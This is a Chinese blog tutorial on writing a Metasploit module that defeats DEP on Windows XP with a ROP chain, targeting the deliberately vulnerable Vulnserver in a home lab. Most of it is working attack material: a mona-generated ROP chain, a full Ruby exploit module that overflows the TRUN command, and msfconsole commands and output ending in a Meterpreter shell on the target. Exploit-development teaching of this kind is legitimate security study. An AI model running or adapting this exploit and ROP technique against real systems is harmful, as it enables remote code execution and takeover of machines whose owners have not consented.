---
layout: post
category: binghe-code-hack
title: 使用Metasploit编写绕过DEP渗透模块
tagline: by 冰河
tag: [hack,binghe-code-hack]
excerpt: 使用Metasploit编写绕过DEP渗透模块
lock: need
---

# 使用Metasploit编写绕过DEP渗透模块

攻击机 Kali 192.168.109.137

靶机 WinXP 192.168.109.141 (也可为其他Win系统，设置为DEP保护)

应用程序 Vulnserver(可以到链接： https://download.csdn.net/download/l1028386804/10921905 下载)

## 将靶机设置DEP保护 

**数据执行保护（Data Execution Prevention，DEP）**是一种将特定内存区域标记为不可执行的保护机制，这种机制会导致我们在渗透过程中无法执行ShellCode。因此，即使我们可以改写EIP寄存器中的内容并成功地将ESP指向了ShellCode的起始地址，也无法执行攻击载荷。这是因为DEP的存在组织了内存中可写区域（例如栈和堆）中数据的执行。在这种情况下，我们必须使用可执行区域中的现存指令实现预期的功能——可以通过将所有的可执行指令放置成一个可以让跳转跳到ShellCode的顺序来实现这一目的。

绕过DEP的技术被称为返回导向编程（Return Oriented Programming，ROP）技术，它不同于通过覆盖改写EIP内容，并跳转到ShellCode栈溢出的普通方法。当DEP启用之后，我们将无法使用这种技术，因为栈中的数据是不能执行的。因此我们不再跳转到ShellCode，而是调用第一个ROP指令片段（gadget）。这些指令片段共同构成一个链式结构，一个指令片段会返回下一个指令片段，而不执行栈中的任何代码。

具体操作如下：

右键"我的电脑"->属性->高级->性能设置->数据执行保存->选择“为除下列选定程序之外的所有程序和服务启用DEP (U)”->确定

![img](https://img-blog.csdnimg.cn/20190117125342351.png)

## 开启Vlunserver监听

在靶机的命令行中切换到vlunserver.exe所在的目录，执行如下命令

```
vlunserver.exe 9999
```

监听9999端口

![img](https://img-blog.csdnimg.cn/20190117125430253.png)

## 开启ImmunityDebugger

![img](https://img-blog.csdnimg.cn/20190117125458129.png)

## 将Vulnserver进程加载到ImmunityDebugger

依次选择ImmunityDebugger的File->Attach

![img](https://img-blog.csdnimg.cn/20190117125523794.png)

显示靶机所有进程的信息

![img](https://img-blog.csdnimg.cn/20190117125536289.png)

我们选中Vulnserver进程并单击右下角的Attach按钮

![img](https://img-blog.csdnimg.cn/20190117125551775.png)

显示Vulnserver进程的运行信息

![img](https://img-blog.csdnimg.cn/20190117125607172.png)

此时看到Vulnserver进程处于暂停状态，我们需要点击ImmunityDebugger的Play按钮

![img](https://img-blog.csdnimg.cn/20190117125620946.png)

此时，看到Vulnserver处于运行状态

![img](https://img-blog.csdnimg.cn/20190117125639410.png)

## 查找Vulnserver运行时加载的所有DLL信息

在ImmunityDebugger的命令行输入如下命令：

```
!mona modules
```

![img](https://img-blog.csdnimg.cn/20190117125708628.png)

## 将msvcrt.dll上传到Kali的/root目录下

这里我们将靶机的C:\Windows\system32\msvcrt.dll上传到Kali的/root目录下。

## 查找ROP指令片段

这里，我们使用到的工具是Metasploit的msfrop，在Kali的命令行输入：

```
msfconsole
msfrop -v -s "pop cex" /root/msvcrt.dll
```

输出太多，这里只截取一部分：

![img](https://img-blog.csdnimg.cn/20190117125804744.png)

## 创建ROP链

在ImmunityDebugger命令行输入如下命令：

```
!mona rop -m *.dll -cp nonull
```

![img](https://img-blog.csdnimg.cn/20190117125843386.png)

执行后会在ImmunityDebugger安装目录下生成一个rop_chains.txt文件

![img](https://img-blog.csdnimg.cn/20190117125857534.png)

我们打开rop_chains.txt文件，找到如下代码片段：

```
def create_rop_chain()

  # rop chain generated with mona.py - www.corelan.be
  rop_gadgets = 
  [
    0x77bfc038,  # POP ECX # RETN [msvcrt.dll] 
    0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll]
    0x77d5373d,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [USER32.dll] 
    0x7c96d192,  # XCHG EAX,ESI # RETN [ntdll.dll] 
    0x77c11c54,  # POP EBP # RETN [msvcrt.dll] 
    0x625011bb,  # & jmp esp [essfunc.dll]
    0x77c04fcd,  # POP EAX # RETN [msvcrt.dll] 
    0xfffffdff,  # Value to negate, will become 0x00000201
    0x77e6d222,  # NEG EAX # RETN [RPCRT4.dll] 
    0x77dc560a,  # XCHG EAX,EBX # RETN [ADVAPI32.dll] 
    0x77f01564,  # POP EAX # RETN [GDI32.dll] 
    0xffffffc0,  # Value to negate, will become 0x00000040
    0x77e6d222,  # NEG EAX # RETN [RPCRT4.dll] 
    0x77ef24c8,  # XCHG EAX,EDX # RETN [GDI32.dll] 
    0x77c0eb4f,  # POP ECX # RETN [msvcrt.dll] 
    0x7c99f17e,  # &Writable location [ntdll.dll]
    0x77c17641,  # POP EDI # RETN [msvcrt.dll] 
    0x77e6d224,  # RETN (ROP NOP) [RPCRT4.dll]
    0x77c04fcd,  # POP EAX # RETN [msvcrt.dll] 
    0x90909090,  # nop
    0x60fe4479,  # PUSHAD # RETN [hnetcfg.dll] 
  ].flatten.pack("V*")

  return rop_gadgets

end
```

![img](https://img-blog.csdnimg.cn/2019011712593726.png)

之后，将这段代码拷贝到我们自己编写的渗透模块中。

## 编写绕过DEP的Metasploit模块脚本dep_attack_by_binghe.rb

不多说，直接上代码：

```
##
# Author 冰河
# Date 2019-01-16
# Description Metasploit绕过DEP
##

require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking
  
  include Msf::Exploit::Remote::Tcp
  
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'DEP Bypass Exploit',
      'Description'    => %q{
        DEP Bypass Using ROP Chains Example Module
      },
      'Platform'       => 'Windows',
      'Author'         => ['binghe'],
      'Payload'        =>
        {
          'space'     => 312,
          'BadChars'  => "\x00"
        },
       'Targets'      => 
        [
          ['Windows XP', {'Offset'  => 2006}]
        ],
        'DisclosureDate'  => '2019-01-16'))
     
     register_options(
      [
        Opt::RPORT(9999)
      ],self.class)
  end
  
   def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      0x77bfc038,  # POP ECX # RETN [msvcrt.dll] 
      0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll]
      0x77d5373d,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [USER32.dll] 
      0x7c96d192,  # XCHG EAX,ESI # RETN [ntdll.dll] 
      0x77c11c54,  # POP EBP # RETN [msvcrt.dll] 
      0x625011bb,  # & jmp esp [essfunc.dll]
      0x77c04fcd,  # POP EAX # RETN [msvcrt.dll] 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x77e6d222,  # NEG EAX # RETN [RPCRT4.dll] 
      0x77dc560a,  # XCHG EAX,EBX # RETN [ADVAPI32.dll] 
      0x77f01564,  # POP EAX # RETN [GDI32.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x77e6d222,  # NEG EAX # RETN [RPCRT4.dll] 
      0x77ef24c8,  # XCHG EAX,EDX # RETN [GDI32.dll] 
      0x77c0eb4f,  # POP ECX # RETN [msvcrt.dll] 
      0x7c99f17e,  # &Writable location [ntdll.dll]
      0x77c17641,  # POP EDI # RETN [msvcrt.dll] 
      0x77e6d224,  # RETN (ROP NOP) [RPCRT4.dll]
      0x77c04fcd,  # POP EAX # RETN [msvcrt.dll] 
      0x90909090,  # nop
      0x60fe4479,  # PUSHAD # RETN [hnetcfg.dll] 
    ].flatten.pack("V*")

    return rop_gadgets

  end
  
  def exploit
    connect
    rop_chain = create_rop_chain()
    junk = rand_text_alpha_upper(target['Offset'])
    buf = "TRUN ." + junk + rop_chain + make_nops(16) + payload.encoded + '\r\n'
    sock.put(buf)
    handler
    disconnect
  end
  
end
```

其中，def create_rop_chain()方法就是从第8步创建的rop_chains.txt文件中复制来的。

## 上传脚本dep_attack_by_binghe.rb

将脚本dep_attack_by_binghe.rb上传到Kali的/usr/share/metasploit-framework/modules/exploits/windows/masteringmetasploit目录下。

## 关闭ImmunityDebugger重新启动Vulnserver

在靶机上关闭ImmunityDebugger并重新启动Vulnserver。

![img](https://img-blog.csdnimg.cn/20190117130049549.png)

## 在Kali上执行

```
msfconsole
use exploit/windows/masteringmetasploit/dep_attack_by_binghe 
set payload windows/meterpreter/bind_tcp
set RHOST 192.168.109.141
show options
exploit
ifconfig
```

具体操作如下：

```
msf > use exploit/windows/masteringmetasploit/dep_attack_by_binghe 
msf exploit(windows/masteringmetasploit/dep_attack_by_binghe) > set payload windows/meterpreter/bind_tcp
payload => windows/meterpreter/bind_tcp
msf exploit(windows/masteringmetasploit/dep_attack_by_binghe) > set RHOST 192.168.109.141
RHOST => 192.168.109.141
msf exploit(windows/masteringmetasploit/dep_attack_by_binghe) > show options

Module options (exploit/windows/masteringmetasploit/dep_attack_by_binghe):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST  192.168.109.141  yes       The target address
   RPORT  9999             yes       The target port (TCP)


Payload options (windows/meterpreter/bind_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LPORT     4444             yes       The listen port
   RHOST     192.168.109.141  no        The target address


Exploit target:

   Id  Name
   --  ----
   0   Windows XP


msf exploit(windows/masteringmetasploit/dep_attack_by_binghe) > exploit

[*] Started bind TCP handler against 192.168.109.141:4444
[*] Sending stage (179779 bytes) to 192.168.109.141

meterpreter > ifconfig

Interface  1
============
Name         : MS TCP Loopback interface
Hardware MAC : 00:00:00:00:00:00
MTU          : 1520
IPv4 Address : 127.0.0.1


Interface 65539
============
Name         : VMware Accelerated AMD PCNet Adapter
Hardware MAC : 00:0c:29:5d:8e:d4
MTU          : 1500
IPv4 Address : 192.168.109.141
IPv4 Netmask : 255.255.255.0


Interface 65540
============
Name         : Bluetooth �)%
Hardware MAC : 3c:a0:67:1a:fe:b4
MTU          : 1500

meterpreter > 
```

成功拿到Meterpreter的Shell。所以，设置系统的DEP保护，对我们来说并没有什么卵用。


## 写在最后

> 如果你觉得冰河写的还不错，请微信搜索并关注「 **冰河技术** 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 **冰河技术** 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 **冰河技术** 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 **冰河技术** 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！


![](https://img-blog.csdnimg.cn/20200906013715889.png)